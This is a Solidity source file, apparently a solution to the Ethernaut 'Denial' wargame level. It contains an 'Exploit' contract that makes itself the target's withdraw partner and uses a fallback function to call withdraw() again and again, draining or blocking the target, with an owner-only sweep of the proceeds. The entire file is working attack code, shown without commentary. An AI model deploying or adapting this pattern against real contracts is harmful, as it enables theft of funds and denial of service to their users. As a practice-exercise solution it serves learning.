// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
  function contractBalance (  ) external view returns ( uint256 );
  function owner (  ) external view returns ( address );
  function partner (  ) external view returns ( address );
  function setWithdrawPartner ( address _partner ) external;
  function withdraw (  ) external;
}

contract Exploit {
  IDenial public Denial;
  address public owner;
  constructor(address _address) {
    Denial = IDenial(_address);
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(owner == msg.sender);
    _;
  }

  function setWithdrawPartner() onlyOwner public {
    Denial.setWithdrawPartner(address(this));
  }

  function withdraw() onlyOwner public {
    payable(msg.sender).transfer(address(this).balance);
  }

  fallback() external payable {
    if (address(Denial).balance > 0) {
      Denial.withdraw();
    }
  }
}
